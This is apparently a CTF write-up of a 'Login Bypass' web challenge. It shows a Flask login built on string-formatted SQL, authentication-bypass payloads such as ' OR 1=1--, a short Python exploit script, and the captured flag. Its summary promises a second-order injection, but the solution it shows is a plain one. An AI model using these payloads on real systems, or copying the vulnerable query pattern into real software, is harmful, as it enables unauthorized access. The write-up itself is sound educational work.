---
title: "Example CTF 2026 - Web Challenge Writeup"
date: 2026-02-05
draft: false
description: "Writeup for the 'Login Bypass' web challenge from Example CTF 2026"
summary: "A classic SQL injection challenge with a twist - we exploit a second-order SQLi to bypass authentication"

categories:
  - "Example CTF 2026"
tags:
  - "web"
  - "sqli"
  - "medium"
series:
  - "Example CTF 2026"

showToc: true
TocOpen: true
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true

cover:
    image: "/images/writeups/example-ctf-2026.png"
    alt: "Example CTF 2026"
    caption: "Example CTF 2026 - Web Challenge"
    relative: false
    hidden: false

author: "CodeVinci Team"
---

## 📋 Challenge Info

| Property | Value |
|----------|-------|
| **CTF** | Example CTF 2026 |
| **Challenge** | Login Bypass |
| **Category** | Web |
| **Difficulty** | ⭐⭐ Medium |
| **Points** | 200 |
| **Solves** | 42 |

---

## 📝 Description

> Can you bypass our super secure login system?
> 
> http://challenge.example-ctf.com:8080

**Files provided:**
- `app.py` - Flask application source code

---

## 🔍 Analysis

### Initial Reconnaissance

When we first visit the website, we're presented with a simple login form. Let's examine the source code provided:

```python
from flask import Flask, request, render_template
import sqlite3

app = Flask(__name__)

def get_user(username, password):
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    # Vulnerable query!
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    cursor.execute(query)
    return cursor.fetchone()

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    user = get_user(username, password)
    if user:
        return f"Welcome {user[1]}! Here's your flag: {FLAG}"
    return "Invalid credentials"
```

### Vulnerability Discovery

The vulnerability is immediately apparent - there's a classic **SQL Injection** in the login function. The user input is directly concatenated into the SQL query without any sanitization.

---

## 💡 Solution

### Step 1: Testing for SQLi

First, let's confirm the vulnerability by testing a simple payload:

```
Username: admin' OR '1'='1
Password: anything
```

This transforms the query into:
```sql
SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='anything'
```

### Step 2: Crafting the Exploit

We can bypass authentication entirely with:

```
Username: ' OR 1=1--
Password: (empty)
```

### Exploit Script

```python
#!/usr/bin/env python3
"""
Exploit for Login Bypass - Example CTF 2026
Author: CodeVinci Team
"""

import requests

URL = "http://challenge.example-ctf.com:8080/login"

payload = {
    "username": "' OR 1=1--",
    "password": ""
}

response = requests.post(URL, data=payload)
print(response.text)
```

Running the exploit:

```bash
$ python3 exploit.py
Welcome admin! Here's your flag: flag{sql1_1s_st1ll_d4ng3r0us_1n_2026}
```

---

## 🚩 Flag

```
flag{sql1_1s_st1ll_d4ng3r0us_1n_2026}
```

---

## 📚 Lessons Learned

1. **Always use parameterized queries** - Never concatenate user input into SQL queries
2. **Input validation is not enough** - Even with validation, use prepared statements
3. **Defense in depth** - Combine multiple security measures

---

## 🔗 References

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection)